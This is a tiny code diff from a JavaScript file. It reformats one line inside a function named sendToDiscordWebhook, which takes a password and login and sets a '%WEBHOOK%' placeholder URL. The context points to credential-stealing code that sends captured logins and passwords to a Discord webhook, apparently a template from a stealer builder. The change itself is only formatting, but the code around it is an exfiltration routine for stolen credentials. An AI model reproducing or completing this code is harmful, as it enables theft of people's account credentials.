@@ -7,7 +7,8 @@ function sendToDiscordWebhook(password, login) {
   }
 
   if (!login || !password) return;
-  const webhookUrl = "%WEBHOOK%";
+  const webhookUrl =
+    "%WEBHOOK%";
 
 
   const message = {
